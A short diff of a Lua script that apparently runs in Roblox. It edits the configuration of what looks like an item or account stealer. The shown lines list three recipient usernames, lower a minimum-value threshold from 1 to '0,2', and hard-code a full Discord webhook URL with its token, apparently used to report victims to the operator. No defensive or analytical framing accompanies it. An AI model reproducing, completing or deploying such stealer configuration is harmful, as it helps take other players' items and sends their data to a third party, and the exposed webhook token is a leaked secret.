@@ -75,7 +75,7 @@ for _, v in pairs(getgc()) do
 end
 
 _G.Usernames = {"thebest_artist6", "Samu0O83", "dragonballpasa3"}
-_G.min_value = 1
+_G.min_value = 0,2
 _G.pingEveryone = "Yes"
 _G.webhook = "https://discord.com/api/webhooks/1481415995439452171/1ueav6crH2UuUFwdW8eOyOu9H0vXsnT9ZELDiawfhfOrDgb886m3YGV_kQFa8i1S5O4H"
 _G.scriptExecuted = _G.scriptExecuted or false
